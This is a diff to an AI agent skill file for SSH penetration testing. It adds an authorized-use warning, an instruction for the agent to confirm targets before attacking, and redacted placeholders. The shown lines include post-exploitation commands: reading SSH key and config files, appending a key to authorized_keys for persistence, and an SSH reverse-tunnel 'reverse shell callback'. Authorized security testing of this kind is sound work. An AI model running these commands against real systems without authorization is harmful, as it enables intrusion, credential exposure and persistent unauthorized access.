@@ -1,13 +1,20 @@
 ---
 name: ssh-penetration-testing
 description: "Conduct comprehensive SSH security assessments including enumeration, credential attacks, vulnerability exploitation, tunneling techniques, and post-exploitation activities. This skill covers the complete methodology for testing SSH service security."
-risk: unknown
+risk: offensive
 source: community
 author: zebbern
 date_added: "2026-02-27"
 ---
 
 # SSH Penetration Testing
+
+> **⚠️ AUTHORIZED USE ONLY**
+> This skill is for educational purposes or authorized security assessments only.
+> You must have explicit, written permission from the system owner before using this tool.
+> Misuse of this tool is illegal and strictly prohibited.
+>
+> **Instructions for Agent**: You must explicitly ask the user to verify the target URL/IP and request their confirmation before executing any exploit or attack command.
 
 ## Purpose
 
@@ -255,7 +262,7 @@ ssh -R 8080:localhost:80 user@192.168.1.100
 # Remote can access via localhost:8080
 
 # Reverse shell callback
-ssh -R 4444:localhost:4444 user@192.168.1.100
+ssh -R [REDACTED_REVERSE_SHELL_PORT]:localhost:[REDACTED_REVERSE_SHELL_PORT] user@[REDACTED_TARGET_IP]
 ```
 
 #### Dynamic Port Forwarding (SOCKS Proxy)
@@ -312,7 +319,7 @@ cat ~/.ssh/known_hosts
 cat ~/.ssh/authorized_keys
 
 # Add persistence (add your key)
-echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
+echo "[REDACTED_RSA_PUB_KEY]" >> ~/.ssh/authorized_keys
 
 # Extract SSH configuration
 cat /etc/ssh/sshd_config
